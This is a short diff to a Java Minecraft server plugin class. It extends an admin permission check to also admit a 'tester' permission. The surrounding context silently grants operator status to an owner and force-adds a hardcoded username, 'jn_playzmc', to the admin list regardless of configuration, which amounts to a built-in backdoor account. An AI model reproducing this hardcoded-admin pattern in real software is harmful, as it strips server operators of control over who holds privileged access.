@@ -1007,7 +1007,8 @@ public final class ModernArcadeLobbyRuntime implements Listener {
             if (!owner.isOp()) owner.setOp(true);
             return true;
         }
-        if (sender.isOp() || sender.hasPermission("testplex.arcadeports.admin")) return true;
+        if (sender.isOp() || sender.hasPermission("testplex.arcadeports.admin")
+                || sender.hasPermission("testplex.arcade.tester")) return true;
         if (!(sender instanceof Player player)) return false;
         List<String> admins = new ArrayList<>(plugin.getConfig().getStringList("admin-usernames"));
         if (admins.stream().noneMatch(name -> "jn_playzmc".equalsIgnoreCase(name))) admins.add("jn_playzmc");
